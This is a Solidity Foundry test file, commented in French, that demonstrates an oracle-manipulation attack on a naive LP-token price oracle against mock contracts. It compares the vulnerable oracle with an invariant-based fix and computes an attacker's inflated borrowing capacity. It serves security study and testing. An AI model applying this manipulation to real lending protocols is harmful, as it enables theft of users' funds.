// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/VulnerableOracle.sol";
import "../src/FixedOracle.sol";
import "../src/mocks/MockPool.sol";
import "../src/mocks/MockPriceFeed.sol";

/// @title OracleManipulationTest - PoC de l'attaque Vicuna Finance
/// @notice Démontre comment l'oracle naïf peut être manipulé
contract OracleManipulationTest is Test {
    MockPool public pool;
    MockPriceFeed public priceFeed;
    VulnerableOracle public vulnerableOracle;
    FixedOracle public fixedOracle;

    address public token0 = address(0x1); // S token
    address public token1 = address(0x2); // stS token

    // État initial du pool: 1M de chaque token, 1M LP tokens
    uint256 constant INITIAL_RESERVE0 = 1_000_000e18;
    uint256 constant INITIAL_RESERVE1 = 1_000_000e18;
    uint256 constant TOTAL_SUPPLY = 1_000_000e18;

    // Prix des tokens (en USD, 18 décimales)
    uint256 constant PRICE_TOKEN0 = 1e18; // $1
    uint256 constant PRICE_TOKEN1 = 1e18; // $1

    function setUp() public {
        // Déployer le price feed et configurer les prix
        priceFeed = new MockPriceFeed();
        priceFeed.setPrice(token0, PRICE_TOKEN0);
        priceFeed.setPrice(token1, PRICE_TOKEN1);

        // Déployer le pool avec réserves équilibrées
        pool = new MockPool(
            token0,
            token1,
            INITIAL_RESERVE0,
            INITIAL_RESERVE1,
            TOTAL_SUPPLY
        );

        // Déployer les deux oracles
        vulnerableOracle = new VulnerableOracle(address(priceFeed));
        fixedOracle = new FixedOracle(address(priceFeed));
    }

    function test_NormalConditions() public view {
        uint256 vulnerablePrice = vulnerableOracle.getLPPrice(address(pool));
        uint256 fixedPrice = fixedOracle.getLPPrice(address(pool));

        console.log("=== CONDITIONS NORMALES ===");
        console.log("Prix LP (vulnerable):", vulnerablePrice / 1e18, "USD");
        console.log("Prix LP (fixed):", fixedPrice / 1e18, "USD");

        // Les deux devraient être ~$2 (1M * $1 + 1M * $1) / 1M = $2
        assertApproxEqRel(vulnerablePrice, 2e18, 0.01e18);
        assertApproxEqRel(fixedPrice, 2e18, 0.01e18);
    }

    function test_OracleManipulationAttack() public {
        console.log("=== ATTAQUE ORACLE MANIPULATION ===");
        console.log("");

        // --- AVANT L'ATTAQUE ---
        uint256 vulnerableBefore = vulnerableOracle.getLPPrice(address(pool));
        uint256 fixedBefore = fixedOracle.getLPPrice(address(pool));
        uint256 kBefore = pool.getK();

        console.log("AVANT MANIPULATION:");
        console.log("  Reserve0:", pool.reserve0() / 1e18);
        console.log("  Reserve1:", pool.reserve1() / 1e18);
        console.log("  K (invariant):", kBefore / 1e36);
        console.log("  Prix LP (vulnerable):", vulnerableBefore / 1e18, "USD");
        console.log("  Prix LP (fixed):", fixedBefore / 1e18, "USD");
        console.log("");

        // --- ATTAQUE: Gros swap pour déséquilibrer le pool ---
        // L'attaquant swap 900k token0 contre token1
        uint256 attackAmount = 900_000e18;
        pool.simulateSwap(attackAmount, true); // true = token0 -> token1

        // --- APRÈS L'ATTAQUE ---
        uint256 vulnerableAfter = vulnerableOracle.getLPPrice(address(pool));
        uint256 fixedAfter = fixedOracle.getLPPrice(address(pool));
        uint256 kAfter = pool.getK();

        console.log("APRES MANIPULATION (swap 900k token0):");
        console.log("  Reserve0:", pool.reserve0() / 1e18);
        console.log("  Reserve1:", pool.reserve1() / 1e18);
        console.log("  K (invariant):", kAfter / 1e36);
        console.log("  Prix LP (vulnerable):", vulnerableAfter / 1e18, "USD");
        console.log("  Prix LP (fixed):", fixedAfter / 1e18, "USD");
        console.log("");

        // --- ANALYSE ---
        uint256 vulnerableChange = ((vulnerableAfter - vulnerableBefore) * 100) / vulnerableBefore;
        
        console.log("IMPACT:");
        console.log("  Variation prix vulnerable: +", vulnerableChange, "%");
        console.log("  Le prix fixe reste stable (base sur k)");

        // L'oracle vulnérable montre un prix gonflé
        assertGt(vulnerableAfter, vulnerableBefore, "Prix vulnerable devrait augmenter");
        
        // L'oracle fixé reste stable (k ne change presque pas)
        assertApproxEqRel(fixedAfter, fixedBefore, 0.05e18, "Prix fixed devrait rester stable");
    }

    function test_ExploitScenario() public {
        console.log("=== SCENARIO D'EXPLOIT COMPLET ===");
        console.log("");

        uint256 collateralAmount = 100e18; // 100 LP tokens
        uint256 collateralRatio = 75; // 75% LTV

        // Prix initial
        uint256 priceBefore = vulnerableOracle.getLPPrice(address(pool));
        uint256 borrowCapacityBefore = (collateralAmount * priceBefore * collateralRatio) / (100 * 1e18);

        console.log("AVANT ATTAQUE:");
        console.log("  Collateral: 100 LP tokens");
        console.log("  Prix LP:", priceBefore / 1e18, "USD");
        console.log("  Capacite emprunt (75% LTV):", borrowCapacityBefore / 1e18, "USD");
        console.log("");

        // Attaque
        pool.simulateSwap(900_000e18, true);

        // Prix après manipulation
        uint256 priceAfter = vulnerableOracle.getLPPrice(address(pool));
        uint256 borrowCapacityAfter = (collateralAmount * priceAfter * collateralRatio) / (100 * 1e18);

        console.log("APRES MANIPULATION:");
        console.log("  Prix LP:", priceAfter / 1e18, "USD");
        console.log("  Capacite emprunt:", borrowCapacityAfter / 1e18, "USD");
        console.log("");

        uint256 stolenAmount = borrowCapacityAfter - borrowCapacityBefore;
        console.log("PROFIT ATTAQUANT:", stolenAmount / 1e18, "USD par 100 LP tokens");

        // L'attaquant peut emprunter plus que la vraie valeur
        assertGt(borrowCapacityAfter, borrowCapacityBefore);
    }
}